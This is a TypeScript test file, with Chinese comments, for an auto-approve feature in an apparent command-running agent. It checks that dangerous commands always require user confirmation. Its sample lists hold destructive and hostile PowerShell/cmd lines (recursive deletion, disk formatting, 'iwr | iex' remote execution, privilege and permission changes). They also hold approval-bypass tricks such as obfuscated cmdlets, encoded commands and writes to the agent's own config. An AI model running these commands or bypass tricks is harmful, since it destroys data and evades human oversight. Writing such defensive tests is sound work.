/**
 * 持久自动放行规则测试（「读法 A」）
 *
 * ⚠ 这是**唯一一处会让命令不经用户确认就执行**的功能，因此测试密度最高的不是
 * "规则能不能匹配"，而是**安全边界**：
 *   1. 默认空规则 = 完全不生效（行为与未配置时一致）；
 *   2. **危险类永不自动放行** —— 无论会话信任怎么设、配置规则怎么写，都必须回到 ask；
 *   3. 非法规则不会让整组降级成"全放行"；
 *   4. 顺序固定：危险 → 会话信任 → 配置规则 → ask。
 */
import { afterEach, describe, expect, it } from "vitest";
import { activeAutoApproveRules, decideApproval, matchAutoApprove, setAutoApproveRules } from "../autoApprove";
import { FORCE_ASK_PREFIX, setRiskRules } from "../format";
import { DANGER } from "../constants";

afterEach(() => {
  setAutoApproveRules([]); // 关闭自动放行
  setRiskRules({}); // 恢复内置风险规则
});

/** 覆盖全部危险红名单的样本命令。 */
const DANGEROUS = [
  "Remove-Item -Recurse .\\x",
  "Remove-Item -Force a.txt",
  "rmdir /s /q C:\\x",
  "rd /s C:\\x",
  "del /f a.txt",
  "Format-Volume -DriveLetter D",
  "diskpart",
  "cipher /w:C",
  "reg add HKLM\\Software\\X",
  "Set-ItemProperty -Path HKLM:\\Software\\X",
  "iwr https://x | iex",
  "Set-ExecutionPolicy Bypass",
  "takeown /f C:\\x",
  "icacls C:\\x /grant Everyone:F",
  "schtasks /create /tn x",
  "shutdown /s",
  "Start-Process cmd -Verb runas",
];

describe("自动放行 —— 默认不生效（安全默认）", () => {
  it("未配置任何规则时，命中判定恒为 null", () => {
    expect(matchAutoApprove("Get-ChildItem")).toBeNull();
    expect(matchAutoApprove("anything at all")).toBeNull();
  });

  it("未配置时决策恒为 ask", () => {
    expect(decideApproval("Get-ChildItem", new Set())).toEqual({ kind: "ask" });
    expect(decideApproval("Set-Content a.txt b", new Set())).toEqual({ kind: "ask" });
  });

  it("空数组 / undefined / null 都等于关闭功能", () => {
    for (const empty of [[], undefined, null, "nope", 42]) {
      const rep = setAutoApproveRules(empty);
      expect(rep.active).toBe(0);
      expect(matchAutoApprove("Get-ChildItem")).toBeNull();
      expect(decideApproval("Get-ChildItem", new Set())).toEqual({ kind: "ask" });
    }
  });
});

describe("★★ 核心安全属性：危险类永不自动放行", () => {
  it.each(DANGEROUS)("通配规则 .* 也不能自动放行危险命令：%s", (code) => {
    setAutoApproveRules([".*"]); // 最宽的规则
    expect(matchAutoApprove(code)).not.toBeNull(); // 规则确实"匹配"了
    // 但决策必须是 ask —— 危险判定在规则之前
    expect(decideApproval(code, new Set())).toEqual({ kind: "ask" });
  });

  it.each(DANGEROUS)("即便会话信任包含了对应类别，危险命令仍为 ask：%s", (code) => {
    setAutoApproveRules([".*"]);
    // 把三个类别都塞进会话信任，制造最坏情况
    const allTrusted = new Set(["readonly", "normal", "danger"] as const);
    expect(decideApproval(code, allTrusted)).toEqual({ kind: "ask" });
  });

  it("MCP / web_read 的强制逐次确认前缀永不自动放行", () => {
    setAutoApproveRules([".*"]);
    const allTrusted = new Set(["readonly", "normal", "danger"] as const);
    for (const text of [
      `${FORCE_ASK_PREFIX}\nMCP 工具调用\nserver: fs\ntool: read_file`,
      `${FORCE_ASK_PREFIX}\n网页读取请求\nURL: https://example.com`,
    ]) {
      expect(decideApproval(text, allTrusted)).toEqual({ kind: "ask" });
    }
  });

  it("红名单逐条覆盖：没有任何一条能被自动放行路径漏过", () => {
    setAutoApproveRules([".*"]);
    const allTrusted = new Set(["readonly", "normal", "danger"] as const);
    const leaked = DANGEROUS.filter((c) => decideApproval(c, allTrusted).kind !== "ask");
    expect(leaked, `以下危险命令被自动放行了：\n${leaked.join("\n")}`).toEqual([]);
  });

  it("每一条 DANGER 正则本身都有样本覆盖（防止将来加了新规则却没测到）", () => {
    // 只是提醒：DANGER 条数变化时，本文件的 DANGEROUS 样本也应当同步
    expect(DANGER.length).toBeGreaterThan(0);
  });

  it("危险列表被用户配置清空时，仍回退内置（危险判定不失效）", () => {
    setRiskRules({ danger: [] }); // 试图关掉危险分级
    setAutoApproveRules([".*"]);
    // setRiskRules 的空列表回退保证：危险命令仍被识别为 danger → 仍为 ask
    expect(decideApproval("Remove-Item -Recurse x", new Set())).toEqual({ kind: "ask" });
  });
});

describe("★★ 复合命令永不自动放行（审批链闭环）", () => {
  const ATTACKS = [
    "Get-Content x | Set-Content D:\\Mica\\config\\agent.json",
    "Get-Content x > config\\agent.json",
    "Get-Date; Remove-Item x",
    "Get-Date\nGet-Location",
    "[IO.File]::WriteAllText('config\\agent.json','x')",
    "& ('Set'+'-Content') a.txt x",
    "Get-Content x -EncodedCommand ZgA=",
    "Get-Content x | % { Set-Content y $_ }",
  ];

  it.each(ATTACKS)("通配规则 + 全部会话信任也不能放行：%s", (code) => {
    setAutoApproveRules([".*"]);
    const allTrusted = new Set(["readonly", "normal", "danger"] as const);
    expect(decideApproval(code, allTrusted)).toEqual({ kind: "ask" });
  });

  it("单条只读命令仍可按会话信任自动放行（不误伤正常路径）", () => {
    setAutoApproveRules([".*"]);
    expect(decideApproval("Get-ChildItem .", new Set(["readonly"] as const))).toEqual({
      kind: "auto-session",
      clsLabel: "只读",
    });
  });
});

describe("决策顺序：危险 → 会话信任 → 配置规则 → ask", () => {
  it("会话信任命中时返回 auto-session 并带上类别标签", () => {
    const d = decideApproval("Get-ChildItem .", new Set(["readonly"] as const));
    expect(d).toEqual({ kind: "auto-session", clsLabel: "只读" });
  });

  it("会话信任优先于配置规则（两者都命中时归因给会话信任）", () => {
    setAutoApproveRules(["Get-ChildItem"]);
    const d = decideApproval("Get-ChildItem .", new Set(["readonly"] as const));
    expect(d.kind).toBe("auto-session");
  });

  it("无会话信任但配置规则命中时返回 auto-config，并带回规则原文", () => {
    setAutoApproveRules(["^\\s*Get-ChildItem"]);
    const d = decideApproval("  Get-ChildItem -Force", new Set());
    expect(d).toEqual({ kind: "auto-config", pattern: "^\\s*Get-ChildItem" });
  });

  it("普通类命令未被信任、未被规则命中时仍为 ask", () => {
    setAutoApproveRules(["^Get-Date"]);
    expect(decideApproval("Set-Content a.txt b", new Set())).toEqual({ kind: "ask" });
  });

  it("会话信任里的 danger 类别不会意外放行危险命令", () => {
    const d = decideApproval("Format-Volume -DriveLetter D", new Set(["danger"] as const));
    expect(d).toEqual({ kind: "ask" });
  });
});

describe("规则容错：非法项跳过，绝不降级为全放行", () => {
  it("非法正则被跳过并计入 skipped，合法项照常生效", () => {
    const rep = setAutoApproveRules(["^Get-ChildItem", "([bad", "   "]);
    expect(rep.active).toBe(1);
    expect(rep.skipped).toBe(2);
    expect(activeAutoApproveRules()).toEqual(["^Get-ChildItem"]);
  });

  it("★ 全部规则非法时 → 功能等于关闭（而不是放行一切）", () => {
    const rep = setAutoApproveRules(["([bad", "also(bad"]);
    expect(rep.active).toBe(0);
    expect(rep.skipped).toBe(2);
    expect(matchAutoApprove("Get-ChildItem")).toBeNull();
    expect(decideApproval("Get-ChildItem", new Set())).toEqual({ kind: "ask" });
  });

  it("非字符串项被跳过", () => {
    const rep = setAutoApproveRules(["ok", 42, null, { a: 1 }, "  "]);
    expect(rep.active).toBe(1);
    expect(rep.skipped).toBe(4);
  });

  it("规则前后空白被去除，且忽略大小写", () => {
    setAutoApproveRules(["  ^get-childitem  "]);
    expect(activeAutoApproveRules()).toEqual(["^get-childitem"]);
    expect(matchAutoApprove("GET-CHILDITEM")).not.toBeNull();
  });

  it("多次设置会完全替换（不会累积旧规则）", () => {
    setAutoApproveRules(["a-rule"]);
    setAutoApproveRules(["b-rule"]);
    expect(activeAutoApproveRules()).toEqual(["b-rule"]);
    expect(matchAutoApprove("a-rule")).toBeNull();
  });

  it("命中时返回的是**第一条**命中的规则（审计可据此定位）", () => {
    setAutoApproveRules(["^Get-", "^Get-ChildItem"]);
    const d = decideApproval("Get-ChildItem .", new Set());
    expect(d).toEqual({ kind: "auto-config", pattern: "^Get-" });
  });
});
